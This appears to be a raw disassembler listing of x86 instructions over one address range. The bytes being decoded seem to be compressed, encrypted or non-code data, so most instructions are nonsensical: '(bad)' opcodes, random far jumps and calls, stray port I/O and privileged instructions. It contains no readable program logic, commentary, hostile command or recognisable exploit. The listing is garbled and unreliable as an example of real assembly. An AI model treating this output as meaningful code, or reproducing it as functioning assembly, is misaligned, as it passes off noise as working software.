  41736a:	(bad)  
  41736b:	cmp    dh,BYTE PTR [edi+0x0]
	...
  4173d6:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  4173e1:	gs pop ds
  4173e3:	mov    eax,ds:0xfa44929e
  4173e8:	add    BYTE PTR [eax],al
  4173ea:	inc    DWORD PTR [eax]
  4173ec:	add    BYTE PTR [eax],al
  4173ee:	mov    ds:0xd6b70d29,al
  4173f3:	sbb    bl,al
  4173f5:	test   al,0x80
  4173f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f8:	mov    ds:0x224db3cf,eax
  4173fd:	sub    DWORD PTR [eax],esi
  4173ff:	test   DWORD PTR [esi+0x6e],0x48f5df63
  417406:	dec    esi
  417407:	or     DWORD PTR [eax-0x367baf34],esp
  41740d:	(bad)  
  41740e:	pop    esp
  41740f:	mov    ebp,0x3823d323
  417414:	call   DWORD PTR [edi+0x4]
  417417:	ds sub edi,edx
  41741a:	sub    al,BYTE PTR [edi]
  41741c:	inc    edi
  41741d:	ss test al,0x5e
  417420:	jae    0x41743a
  417422:	sub    DWORD PTR [ecx+0x73cfd431],ebp
  417428:	pop    ds
  417429:	cld    
  41742a:	xor    al,0x8e
  41742c:	(bad)  
  41742d:	pop    edi
  41742e:	gs pop es
  417430:	push   es
  417431:	pop    ss
  417432:	xor    bl,ch
  417434:	imul   esp,DWORD PTR [esp+edx*8],0xffffffca
  417438:	stos   BYTE PTR es:[edi],al
  417439:	ins    DWORD PTR es:[edi],dx
  41743a:	imul   ebp,DWORD PTR [edi+0x1a],0x48aebc62
  417441:	push   0x109550f8
  417446:	loop   0x417475
  417448:	xchg   edi,eax
  417449:	dec    ecx
  41744a:	inc    esp
  41744b:	bound  ebx,QWORD PTR [edi-0x19]
  41744e:	lds    edi,FWORD PTR [ecx+0x30f38027]
  417454:	lahf   
  417455:	and    eax,0x19ee851b
  41745a:	imul   edi,DWORD PTR [esi-0x4e0a0c31],0xffffffb5
  417461:	pop    esp
  417462:	mov    al,0x1e
  417464:	cmc    
  417465:	pop    edx
  417466:	add    eax,0x2ac2bd24
  41746b:	addr16 xchg ebp,eax
  41746d:	push   cs
  41746e:	jp     0x4174db
  417470:	or     ecx,0xffffffc9
  417473:	pop    edx
  417474:	shl    DWORD PTR [edx-0x2f],1
  417477:	sbb    esp,DWORD PTR [esi-0x2a]
  41747a:	imul   edx,DWORD PTR [ebp-0x57],0xd180c517
  417481:	add    al,cl
  417483:	mov    edx,0xa2abb3e2
  417488:	popf   
  417489:	scas   eax,DWORD PTR es:[edi]
  41748a:	and    BYTE PTR [edx+0x11],0x15
  41748e:	cmp    edi,DWORD PTR [esi]
  417490:	sub    al,0xf6
  417492:	lahf   
  417493:	cli    
  417494:	push   es
  417495:	jno    0x4174df
  417497:	fild   DWORD PTR [eax]
  417499:	dec    esi
  41749a:	nop
  41749b:	loop   0x4174a0
  41749d:	jp     0x4174d1
  41749f:	nop
  4174a0:	inc    eax
  4174a1:	and    BYTE PTR [edi],bh
  4174a3:	pop    ss
  4174a4:	data16 into 
  4174a6:	pop    ecx
  4174a7:	mov    ebp,0x85c8f734
  4174ac:	jmp    0x4174f6
  4174ae:	or     eax,0x62a0db83
  4174b3:	cmp    DWORD PTR [eax+0x3ca493a0],ebp
  4174b9:	ins    BYTE PTR es:[edi],dx
  4174ba:	mov    ecx,0xf6406207
  4174bf:	mov    ebx,0xda1c6f35
  4174c4:	bound  ebp,QWORD PTR [ebp-0x5e]
  4174c7:	aaa    
  4174c8:	or     eax,0x34999eac
  4174cd:	push   ecx
  4174ce:	mov    bl,0x37
  4174d0:	mov    ebx,eax
  4174d2:	adc    al,BYTE PTR [ebp-0x7932fa3e]
  4174d8:	leave  
  4174d9:	push   ss
  4174da:	jl     0x41752e
  4174dc:	out    0x9d,eax
  4174de:	jb     0x4174cf
  4174e0:	int    0x80
  4174e2:	inc    ebp
  4174e3:	mov    dh,BYTE PTR [esi+0x5b9abd43]
  4174e9:	sub    al,BYTE PTR [ecx-0x2b]
  4174ec:	ret    0x0
	...
  417553:	add    BYTE PTR [eax],al
  417555:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41755b:	fdivr  st(7),st
  41755d:	mov    edi,0x212a686b
  417562:	cwde   
  417563:	xchg   esi,eax
  417564:	in     al,0x4
  417566:	inc    ebx
  417567:	sti    
  417568:	add    BYTE PTR [eax],al
  41756a:	inc    DWORD PTR [eax]
  41756c:	add    BYTE PTR [eax],al
  41756e:	xchg   edx,eax
  41756f:	jge    0x41758f
  417571:	fisttp QWORD PTR [edi+0x7ad228ef]
  417577:	push   0x90bd25
  41757c:	jns    0x4175fb
  41757e:	and    edx,DWORD PTR [edx+0x4c]
  417581:	sbb    ah,0xce
  417584:	dec    ebx
  417585:	xor    al,0x54
  417587:	adc    edx,edx
  417589:	out    0x80,al
  41758b:	add    DWORD PTR [ecx],esp
  41758d:	mov    edx,0xcf498bc
  417592:	inc    esi
  417593:	sbb    BYTE PTR [eax-0x7a],cl
  417596:	fstp   DWORD PTR [edx+ebp*4]
  417599:	inc    eax
  41759a:	lods   eax,DWORD PTR ds:[esi]
  41759b:	imul   ecx,DWORD PTR [edi+esi*2+0x1d8dfe5],0xfffffff0
  4175a3:	test   al,0xc7
  4175a5:	enter  0xc097,0x77
  4175a9:	repnz test BYTE PTR [esi-0x1c],dl
  4175ad:	cmp    ah,BYTE PTR [ebx+edx*2]
  4175b0:	inc    edx
  4175b1:	xor    DWORD PTR [ebp-0x2d202425],0xc9c64888
  4175bb:	or     BYTE PTR [edx+0x16724dda],ah
  4175c1:	sbb    eax,0x67aea800
  4175c6:	in     al,dx
  4175c7:	lods   al,BYTE PTR ds:[esi]
  4175c8:	test   ecx,0x3f58faec
  4175ce:	mov    bh,0xa
  4175d0:	xchg   edi,eax
  4175d1:	std    
  4175d2:	(bad)  
  4175d4:	cmp    BYTE PTR [ebx],0xb8
  4175d7:	sub    eax,0x98aef463
  4175dc:	mov    ch,0xfc
  4175de:	lahf   
  4175df:	inc    ebx
  4175e0:	sub    DWORD PTR ds:0xaf6c72fd,ebx
  4175e6:	lods   eax,DWORD PTR ds:[esi]
  4175e7:	mov    dh,0xef
  4175e9:	imul   edi,DWORD PTR [eax],0xffffffe4
  4175ec:	ss dec edi
  4175ee:	inc    ebx
  4175ef:	cmp    al,BYTE PTR [edi+0x3]
  4175f2:	pushf  
  4175f3:	in     eax,dx
  4175f4:	cmp    cl,BYTE PTR [ebx]
  4175f6:	sub    eax,0x7defc1f9
  4175fb:	lods   eax,DWORD PTR ds:[esi]
  4175fc:	ins    BYTE PTR es:[edi],dx
  4175fd:	out    0x70,al
  4175ff:	loopne 0x417584
  417601:	jge    0x41761b
  417603:	lock add al,dl
  417606:	pop    edx
  417607:	inc    edx
  417608:	data16 ja 0x417657
  41760b:	mov    ds:0xad2d49b7,eax
  417610:	or     al,0xca
  417612:	xlat   BYTE PTR ds:[ebx]
  417613:	in     al,dx
  417614:	cwde   
  417615:	dec    edi
  417616:	jns    0x417629
  417618:	xchg   ecx,eax
  417619:	sbb    eax,0xbeadc55f
  41761e:	xor    al,0x1b
  417620:	in     al,dx
  417621:	test   eax,0x95a30f49
  417626:	stc    
  417627:	or     BYTE PTR [esi+0x38],0x4e
  41762b:	(bad)  
  41762c:	std    
  41762d:	adc    eax,0x6fa8ca58
  417632:	xor    eax,0x50d624c3
  417637:	xchg   DWORD PTR [eax-0x5c00e173],esp
  41763d:	mov    esp,0x4074c8a9
  417642:	shl    DWORD PTR [edx],cl
  417644:	aas    
  417645:	adc    eax,esi
  417647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417648:	mov    ecx,0x13b8f667
  41764d:	xor    al,0xa9
  41764f:	xchg   ebp,ecx
  417651:	xor    ebp,DWORD PTR [edi+0x76]
  417654:	xor    eax,0x8002057e
  417659:	or     DWORD PTR [ecx+0x3d],esp
  41765c:	hlt    
  41765d:	or     eax,0xcbe7780b
  417662:	lds    eax,FWORD PTR [ecx]
  417664:	repnz jmp 0x9395:0x1a1adbca
  41766c:	repnz add BYTE PTR [eax],al
	...
  4176d3:	add    BYTE PTR [eax],al
  4176d5:	add    BYTE PTR [ecx-0x20b02c99],ch
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fimul  DWORD PTR [ebp+0x42d48bb3]
  4176e7:	cld    
  4176e8:	add    BYTE PTR [eax],al
  4176ea:	inc    DWORD PTR [eax]
  4176ec:	add    BYTE PTR [eax],al
  4176ee:	jae    0x417704
  4176f0:	nop
  4176f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176f2:	inc    eax
  4176f3:	(bad)  
  4176f4:	add    BYTE PTR gs:[esi-0x296e5257],al
  4176fb:	shr    DWORD PTR [ecx-0x16],1
  4176fe:	xor    cl,bl
  417700:	push   ecx
  417701:	daa    
  417702:	pop    esi
  417703:	add    esi,eax
  417705:	push   0x8a3f9819
  41770a:	jne    0x41775f
  41770c:	mov    WORD PTR [ecx-0x7d6420fc],ss
  417712:	sar    cl,1
  417714:	loope  0x4176f1
  417716:	or     eax,0x7fb1b4c4
  41771b:	push   ecx
  41771c:	repz daa 
  41771e:	xchg   esp,eax
  41771f:	retf   0x5419
  417722:	push   0xffffffb4
  417724:	sar    ecx,cl
  417726:	cmp    DWORD PTR [ecx],esp
  417728:	std    
  417729:	and    eax,0x8933ad1a
  41772e:	imul   edi,DWORD PTR [ebp+0x6e05f0a4],0x3e2adc00
  417738:	adc    cl,BYTE PTR [ebp+edx*1+0x78]
  41773c:	push   cs
  41773d:	pop    ebx
  41773e:	fnsave ds:0x9c8e11a3
  417744:	sti    
  417745:	adc    al,0x12
  417747:	inc    esp
  417748:	push   esi
  417749:	inc    edi
  41774a:	out    dx,al
  41774b:	add    BYTE PTR [ecx],bl
  41774d:	xchg   ebp,eax
  41774e:	mov    eax,ds:0x83a1eba5
  417753:	icebp  
  417754:	push   ds
  417755:	retf   
  417756:	xor    ecx,DWORD PTR [eax-0x3e]
  417759:	test   bh,cl
  41775b:	lahf   
  41775c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41775d:	mov    ebx,0x53947870
  417762:	mov    al,0x39
  417764:	(bad)  
  417765:	xlat   BYTE PTR ds:[ebx]
  417766:	js     0x4176f4
  417768:	rcl    edx,cl
  41776a:	out    dx,eax
  41776b:	inc    esi
  41776c:	add    eax,0x7f3b3899
  417771:	les    edi,FWORD PTR [edi-0x1079db80]
  417777:	mov    BYTE PTR [edx],cl
  417779:	adc    al,0x7e
  41777b:	or     eax,0x5e450a46
  417780:	dec    ebp
  417781:	mov    edi,0xcdbfd537
  417786:	loop   0x4177a8
  417788:	clc    
  417789:	loopne 0x417802
  41778b:	je     0x417729
  41778d:	push   esp
  41778e:	fs sahf 
  417790:	adc    edi,DWORD PTR ds:0xf36df9f9
  417796:	mov    bh,0xd9
  417798:	jl     0x41771a
  41779a:	(bad)  
  41779c:	repnz inc esp
  41779e:	andps  xmm3,XMMWORD PTR [eax+ebx*1-0x2f]
  4177a3:	sbb    al,0x49
  4177a5:	out    dx,eax
  4177a6:	ret    0xa3de
  4177a9:	and    esp,DWORD PTR [edi-0x6da349da]
  4177af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177b0:	aas    
  4177b1:	lods   al,BYTE PTR ds:[esi]
  4177b2:	cli    
  4177b3:	xor    esi,0xffffffd6
  4177b6:	test   BYTE PTR [esi+0x91c8bc7],bl
  4177bc:	imul   BYTE PTR [edi+0xf4ab22f]
  4177c2:	cmp    DWORD PTR [esi+0x7],esi
  4177c5:	jmp    0x417799
  4177c7:	fcom   QWORD PTR [ebx-0x347fddff]
  4177cd:	mov    edx,0x8b8d4a46
  4177d2:	test   al,0x0
  4177d4:	sbb    al,dh
  4177d6:	pop    esi
  4177d7:	pop    ebx
  4177d8:	push   esi
  4177d9:	xchg   DWORD PTR [edi+0x62eb2df7],ebx
  4177df:	daa    
  4177e0:	std    
  4177e1:	ja     0x41780a
  4177e3:	out    0xf8,eax
  4177e5:	call   0x583:0x5fdeb118
  4177ec:	scas   eax,DWORD PTR es:[edi]
	...
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	shr    BYTE PTR [ebp+0x41],cl
  417864:	pop    edx
  417865:	adc    eax,DWORD PTR [ecx-0x3]
  417868:	add    BYTE PTR [eax],al
  41786a:	inc    DWORD PTR [eax]
  41786c:	add    BYTE PTR [eax],al
  41786e:	fsubr  DWORD PTR [ebx+0x3e9165e0]
  417874:	inc    edx
  417875:	(bad)  
  417876:	adc    bh,BYTE PTR [eax]
  417878:	retf   0xb454
  41787b:	dec    ebp
  41787c:	mov    eax,ds:0xa9a58e93
  417881:	push   ebx
  417882:	cs mov esi,0x8e0357c3
  417888:	test   BYTE PTR [ecx+0x0],cl
  41788b:	je     0x417890
  41788d:	lods   eax,DWORD PTR ds:[esi]
  41788e:	sub    DWORD PTR [edx],0x4a62f9d
  417894:	in     al,dx
  417895:	ds jge 0x4178d2
  417898:	add    DWORD PTR [edx+0x63972a3e],edi
  41789e:	lock in eax,dx
  4178a0:	cdq    
  4178a1:	int3   
  4178a2:	mov    edx,0x2483e7cc
  4178a7:	add    BYTE PTR [ecx-0x307d905b],0xe3
  4178ae:	fnstcw WORD PTR [esi+0x17]
  4178b1:	xchg   BYTE PTR [ecx*1-0x3942e14a],ah
  4178b8:	and    DWORD PTR [ecx],0x17
  4178bb:	pop    esi
  4178bc:	out    dx,al
  4178bd:	mov    edx,0xf81df59
  4178c2:	adc    edi,ebp
  4178c4:	xchg   edx,eax
  4178c5:	loopne 0x417942
  4178c7:	jne    0x4178a6
  4178c9:	sub    al,0xf6
  4178cb:	sbb    DWORD PTR [edx+ebx*1-0x578210a5],esp
  4178d2:	dec    ebx
  4178d3:	test   al,0xf6
  4178d5:	push   cs
  4178d6:	inc    edi
  4178d7:	(bad)  
  4178d8:	in     al,dx
  4178d9:	mov    cl,0x82
  4178db:	ds aad 0x1f
  4178de:	pop    esp
  4178df:	pushf  
  4178e0:	(bad)  
  4178e1:	js     0x4178ec
  4178e3:	sbb    al,0xc4
  4178e5:	pop    ecx
  4178e6:	popf   
  4178e7:	mov    esp,0x185f0e6b
  4178ec:	jne    0x41790a
  4178ee:	xchg   esp,eax
  4178ef:	lods   al,BYTE PTR ds:[esi]
  4178f0:	in     eax,dx
  4178f1:	leave  
  4178f2:	sbb    DWORD PTR [edi],edx
  4178f4:	mov    ecx,0x78e6d7d8
  4178f9:	test   BYTE PTR [ebp+0x53a976e3],ah
  4178ff:	xor    eax,0xb48eda17
  417904:	xor    dh,BYTE PTR [esp+eax*8+0xf]
  417908:	push   ebx
  417909:	cmp    edx,DWORD PTR [edx-0x6a]
  41790c:	sub    DWORD PTR [ecx+0x2c1b77ca],ebx
  417912:	call   0xd247:0x6d1671a8
  417919:	fisttp WORD PTR [eax]
  41791b:	ja     0x417935
  41791d:	ja     0x4178de
  41791f:	sub    al,0xba
  417921:	dec    ebp
  417922:	lock test BYTE PTR [esi+edx*8+0x32],dl
  417927:	xchg   esi,eax
  417928:	out    0xe8,al
  41792a:	mov    ecx,DWORD PTR [edi+esi*8-0x1d]
  41792e:	mov    esi,0x5d88ec6f
  417933:	dec    ecx
  417934:	hlt    
  417935:	leave  
  417936:	stos   BYTE PTR es:[edi],al
  417937:	fiadd  WORD PTR [ebx+0x19]
  41793a:	les    ecx,FWORD PTR [edi-0x66]
  41793d:	fbld   TBYTE PTR [ecx]
  41793f:	jb     0x4178e0
  417941:	inc    BYTE PTR es:[ebx-0x5c66e59d]
  417948:	dec    edi
  417949:	mov    BYTE PTR [ecx-0x7341f991],dl
  41794f:	and    ebx,DWORD PTR [edx+0x110e4247]
  417955:	retf   
  417956:	fisttp WORD PTR [ecx+0x4]
  417959:	popf   
  41795a:	cld    
  41795b:	push   ebx
  41795c:	sbb    eax,0x73008802
  417961:	fcomi  st,st(3)
  417963:	imul   edx,ebp,0x55
  417966:	mov    dl,0xaa
  417968:	iret   
  417969:	into   
  41796a:	jge    0x417939
  41796c:	inc    edx
	...
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	(bad)  
  4179e3:	push   eax
  4179e4:	inc    edi
  4179e5:	and    DWORD PTR [eax-0x2],eax
  4179e8:	add    BYTE PTR [eax],al
  4179ea:	inc    DWORD PTR [eax]
  4179ec:	add    BYTE PTR [eax],al
  4179ee:	stc    
  4179ef:	mov    eax,ds:0xc8959fdd
  4179f4:	mov    ch,0xbf
  4179f6:	sub    dl,BYTE PTR ds:0x90c6b212
  4179fc:	sbb    BYTE PTR [edi+0x492d437e],dl
  417a02:	seta   BYTE PTR [edx]
  417a05:	shl    eax,0x76
  417a08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a09:	lods   al,BYTE PTR ds:[esi]
  417a0a:	mov    esi,0x16c5d618
  417a0f:	cs or  al,0xe3
  417a12:	cmp    al,0xa7
  417a14:	stos   DWORD PTR es:[edi],eax
  417a15:	push   ebp
  417a16:	ja     0x417a53
  417a18:	retf   0x38f0
  417a1b:	je     0x417a11
  417a1d:	push   0x86f7f2b7
  417a22:	out    0x90,al
  417a24:	out    0x9e,eax
  417a26:	lods   eax,DWORD PTR ds:[esi]
  417a27:	xchg   esp,eax
  417a28:	(bad)  
  417a29:	lods   al,BYTE PTR ds:[esi]
  417a2a:	xor    al,0x64
  417a2c:	add    eax,0x7152bac2
  417a31:	fidivr WORD PTR [esi+eiz*8+0x5e]
  417a35:	push   eax
  417a36:	dec    ebx
  417a37:	pop    edx
  417a38:	dec    ebp
  417a39:	arpl   WORD PTR [ebx+0x56],bx
  417a3c:	es (bad) 
  417a3e:	fst    DWORD PTR [ebp+0x62]
  417a41:	xor    BYTE PTR [ecx],dh
  417a43:	jnp    0x417a95
  417a45:	mov    eax,ds:0x9c6b7992
  417a4a:	sub    DWORD PTR [ecx],ebp
  417a4c:	and    DWORD PTR [ecx],0x5b3524a0
  417a52:	mov    edx,0x2dc3662d
  417a57:	out    0x1,al
  417a59:	push   eax
  417a5a:	ss (bad) 
  417a5c:	push   esi
  417a5d:	das    
  417a5e:	mov    ah,0x3d
  417a60:	js     0x417a5a
  417a62:	fs lahf 
  417a64:	daa    
  417a65:	sbb    ah,BYTE PTR [esi]
  417a67:	xor    dh,0x4f
  417a6a:	cmc    
  417a6b:	pop    ebx
  417a6c:	popa   
  417a6d:	out    dx,al
  417a6e:	in     al,dx
  417a6f:	std    
  417a70:	mov    dh,0xcd
  417a72:	inc    BYTE PTR [ebx-0x74bb11e8]
  417a78:	or     edi,DWORD PTR ds:0x8e09f72a
  417a7e:	fnstsw WORD PTR [esi+0xd]
  417a81:	rcr    bh,cl
  417a83:	sub    eax,DWORD PTR [eax+0x50da2969]
  417a89:	mov    eax,0x75ab3c45
  417a8e:	mov    dl,BYTE PTR [edi-0x77]
  417a91:	fist   DWORD PTR [ebx]
  417a93:	jbe    0x417a55
  417a95:	ret    
  417a96:	mov    ebp,0xa0c869fb
  417a9b:	mov    eax,ds:0x41a8bb74
  417aa0:	dec    ebp
  417aa1:	inc    eax
  417aa2:	icebp  
  417aa3:	sbb    al,0xad
  417aa5:	stc    
  417aa6:	ins    DWORD PTR es:[edi],dx
  417aa7:	pop    ds
  417aa8:	sub    al,0x91
  417aaa:	xchg   esp,eax
  417aab:	and    al,0xf5
  417aad:	inc    ebx
  417aae:	push   esi
  417aaf:	jg     0x417b00
  417ab1:	nop
  417ab2:	jo     0x417a4b
  417ab4:	cmp    bl,BYTE PTR ds:0xce8265ee
  417aba:	or     esp,DWORD PTR [ecx-0x4e]
  417abd:	shl    DWORD PTR [ecx],cl
  417abf:	mov    al,0x84
  417ac1:	outs   dx,DWORD PTR ds:[esi]
  417ac2:	and    bh,ah
  417ac4:	inc    ebx
  417ac5:	test   DWORD PTR [ecx+0x6d500d7a],edi
  417acb:	(bad)  
  417acc:	push   edi
  417acd:	push   es
  417ace:	pusha  
  417acf:	ror    DWORD PTR ds:0x91b8aea,cl
  417ad5:	mov    BYTE PTR [ebx+0x7d09526a],ch
  417adb:	inc    ebp
  417adc:	lea    eax,[ecx]
  417ade:	inc    eax
  417adf:	gs xchg ecx,eax
  417ae1:	pop    ebp
  417ae2:	adc    BYTE PTR [ecx+0x7a],dh
  417ae5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ae6:	pop    es
  417ae7:	ds pop edi
  417ae9:	mov    edx,0xc6f656
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx+0x624d0f76]
  417b66:	aas    
  417b67:	inc    DWORD PTR [eax]
  417b69:	add    bh,bh
  417b6b:	add    BYTE PTR [eax],al
  417b6d:	add    BYTE PTR [ebp-0x15],al
  417b70:	adc    BYTE PTR [eax-0x81bad18],0x59
  417b77:	(bad)  
  417b78:	mov    BYTE PTR [eax+0x1bc63c6],al
  417b7e:	push   DWORD PTR [edi]
  417b80:	sub    DWORD PTR [ebp+0x20],edi
  417b83:	leave  
  417b84:	pusha  
  417b85:	mov    dh,0xe3
  417b87:	sbb    DWORD PTR [ebx-0x32e54472],0xcfdf5414
  417b91:	xchg   ebp,eax
  417b92:	push   ss
  417b93:	shl    BYTE PTR [eax],cl
  417b95:	or     dh,BYTE PTR [eax]
  417b97:	and    ebx,ecx
  417b99:	pusha  
  417b9a:	dec    edi
  417b9b:	ret    0x6c2d
  417b9e:	rcr    BYTE PTR [esi+0x40],cl
  417ba1:	push   edx
  417ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ba3:	sbb    ebp,DWORD PTR [edi-0x21a393d8]
  417ba9:	out    0x92,al
  417bab:	in     al,0xc1
  417bad:	dec    ebx
  417bae:	(bad)  
  417baf:	es cmp dl,ah
  417bb2:	jp     0x417bfc
  417bb4:	sbb    ecx,ecx
  417bb6:	inc    esp
  417bb7:	add    DWORD PTR [ecx+0x1062865b],edx
  417bbd:	cmp    al,0x9
  417bbf:	loop   0x417c3a
  417bc1:	xchg   BYTE PTR [edi-0x4a],bl
  417bc4:	sbb    DWORD PTR [edx+0x12],0x87db5c21
  417bcb:	push   0xffffffbb
  417bcd:	repnz jmp 0xeefc:0xdfc212cb
  417bd5:	cmp    BYTE PTR [edx-0x25],0xd3
  417bd9:	inc    ecx
  417bda:	imul   edi,ebp,0xffffffbb
  417bdd:	xchg   DWORD PTR [eax-0x7f],ebp
  417be0:	mov    al,BYTE PTR ds:0xcff10a82
  417be6:	and    DWORD PTR [esi],edx
  417be8:	(bad)  
  417be9:	mov    ds:0x638e16f9,eax
  417bee:	jp     0x417c3d
  417bf0:	mov    al,ds:0xf92635ae
  417bf5:	push   ebp
  417bf6:	clc    
  417bf7:	mov    ebp,DWORD PTR [ebx+0x4f]
  417bfa:	push   0xe252645b
  417bff:	add    al,0x2e
  417c01:	in     al,dx
  417c02:	bound  ebx,QWORD PTR [ecx]
  417c04:	enter  0x4a6a,0xef
  417c08:	imul   edx,ecx,0xb0a6dc0
  417c0e:	outs   dx,DWORD PTR ds:[esi]
  417c0f:	lods   eax,DWORD PTR ds:[esi]
  417c10:	shl    BYTE PTR [edx],1
  417c12:	pop    edi
  417c13:	test   al,0x38
  417c15:	dec    eax
  417c16:	xchg   ecx,eax
  417c17:	cmp    BYTE PTR [ebx+0x6a5b82a2],ch
  417c1d:	xor    bl,al
  417c1f:	in     al,dx
  417c20:	jle    0x417bcc
  417c22:	and    DWORD PTR [edx+0x8ad200e],ecx
  417c28:	inc    ebp
  417c29:	stc    
  417c2a:	inc    ecx
  417c2b:	cmc    
  417c2c:	jb     0x417c1a
  417c2e:	pop    edi
  417c2f:	adc    edx,edx
  417c31:	popf   
  417c32:	and    BYTE PTR [ebp-0x4f1dba6],bh
  417c38:	(bad)  
  417c39:	ins    DWORD PTR es:[edi],dx
  417c3a:	xchg   ebx,eax
  417c3b:	xor    ch,BYTE PTR [ecx+0x66]
  417c3e:	sub    DWORD PTR [edx+ebx*1+0x1f],esi
  417c42:	ins    DWORD PTR es:[edi],dx
  417c43:	out    dx,al
  417c44:	fidivr WORD PTR [edx-0x4e]
  417c47:	mov    eax,0xe387221d
  417c4c:	out    dx,al
  417c4d:	and    DWORD PTR [ebp+0x206ccc97],0xca471135
  417c57:	repz push 0xc7f99cd7
  417c5d:	sbb    eax,0x170aefa1
  417c62:	push   edi
  417c63:	or     ch,cl
  417c65:	xchg   ebx,eax
  417c66:	cmp    bh,BYTE PTR [eax+ebx*4+0x4d]
  417c6a:	mov    dh,0xdc
  417c6c:	scas   al,BYTE PTR es:[edi]
	...
  417cd5:	add    BYTE PTR [ecx-0x267b6f40],cl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x4b
  417ce3:	mov    eax,ds:0x3e0bc7
  417ce8:	add    DWORD PTR [eax],eax
  417cea:	inc    DWORD PTR [eax]
  417cec:	add    BYTE PTR [eax],al
  417cee:	and    edi,DWORD PTR [ecx-0x79a83752]
  417cf4:	mov    al,0x12
  417cf6:	sbb    BYTE PTR [edx],dh
  417cf8:	ins    BYTE PTR es:[edi],dx
  417cf9:	int3   
  417cfa:	dec    esp
  417cfb:	add    eax,0xe58a6c5a
  417d00:	xor    DWORD PTR [ecx],edi
  417d02:	bnd jno 0x417d5b
  417d05:	mov    ds:0x3a5582e3,al
  417d0a:	push   eax
  417d0b:	inc    ecx
  417d0c:	test   DWORD PTR [edx+0x38],eax
  417d0f:	loop   0x417d87
  417d11:	sbb    DWORD PTR [ecx+0x1d6d6e8a],0xffffffb9
  417d18:	pop    edi
  417d19:	loopne 0x417cfc
  417d1b:	das    
  417d1c:	mov    bl,0xb5
  417d1e:	cwde   
  417d1f:	jge    0x417d28
  417d21:	push   ebx
  417d22:	cmp    BYTE PTR [edi],bh
  417d24:	push   edx
  417d25:	mov    ah,0xc9
  417d27:	dec    ebx
  417d28:	xor    eax,0xed5efbf6
  417d2d:	xchg   esp,eax
  417d2e:	adc    BYTE PTR [esi],bh
  417d30:	jb     0x417ccc
  417d32:	repz lahf 
  417d34:	push   esp
  417d35:	sbb    cl,dl
  417d37:	lods   al,BYTE PTR ds:[esi]
  417d38:	ss xchg edx,eax
  417d3a:	test   DWORD PTR [esi+0x5eb4f74],ebx
  417d40:	mov    WORD PTR [edx],?
  417d42:	daa    
  417d43:	pushf  
  417d44:	xchg   DWORD PTR [ebx-0x1bd17e33],ecx
  417d4a:	scas   al,BYTE PTR es:[edi]
  417d4b:	outs   dx,DWORD PTR ds:[esi]
  417d4c:	cld    
  417d4d:	enter  0x4dff,0x62
  417d51:	jmp    0x28d494e2
  417d56:	push   cs
  417d57:	dec    ebp
  417d58:	call   0x463761d1
  417d5d:	out    0x2,al
  417d5f:	jl     0x417d5d
  417d61:	push   edx
  417d62:	leave  
  417d63:	adc    bl,BYTE PTR [ebx]
  417d65:	xlat   BYTE PTR ds:[ebx]
  417d66:	popf   
  417d67:	call   0xe2fc2e49
  417d6c:	jecxz  0x417d78
  417d6e:	(bad)  
  417d6f:	loopne 0x417dc3
  417d71:	and    bx,WORD PTR [edi-0x2fbe8fa5]
  417d78:	mov    dh,0xf9
  417d7a:	cmp    DWORD PTR [ebp-0xbe677b1],0xffffffb6
  417d81:	gs pusha 
  417d83:	test   al,0x7c
  417d85:	push   0xffffff87
  417d87:	inc    ebp
  417d88:	or     dl,bl
  417d8a:	dec    eax
  417d8b:	pop    edi
  417d8c:	and    dh,cl
  417d8e:	hlt    
  417d8f:	(bad)  
  417d90:	shr    ch,cl
  417d92:	scas   eax,DWORD PTR es:[edi]
  417d93:	inc    esp
  417d94:	dec    ecx
  417d95:	cmp    BYTE PTR [edi-0x4fc43bb2],dl
  417d9b:	sahf   
  417d9c:	lds    ebp,FWORD PTR [ebx+0x3eda139]
  417da2:	mov    BYTE PTR [edi+edi*2],ch
  417da5:	push   cs
  417da6:	push   esi
  417da7:	jmp    0x68aa:0x81255474
  417dae:	and    eax,DWORD PTR [ecx]
  417db0:	stos   BYTE PTR es:[edi],al
  417db1:	js     0x417d85
  417db3:	nop
  417db4:	adc    ch,BYTE PTR [eax-0x5c]
  417db7:	mov    ah,0x3a
  417db9:	mov    eax,0xfd235417
  417dbe:	rcr    BYTE PTR [eax],1
  417dc0:	push   0x48181209
  417dc5:	mov    ds:0x7bc93386,al
  417dca:	and    al,cl
  417dcc:	in     al,dx
  417dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dce:	push   esi
  417dcf:	nop
  417dd0:	add    dl,0xd6
  417dd3:	ja     0x417de2
  417dd5:	jecxz  0x417d86
  417dd7:	gs dec eax
  417dd9:	clc    
  417dda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ddb:	stos   DWORD PTR es:[edi],eax
  417ddc:	dec    edi
  417ddd:	xor    DWORD PTR [edx-0xb],ebx
  417de0:	jg     0x417e60
  417de2:	aas    
  417de3:	mov    ds:0xbdb139b6,eax
  417de8:	jge    0x417e63
  417dea:	push   ecx
  417deb:	out    dx,eax
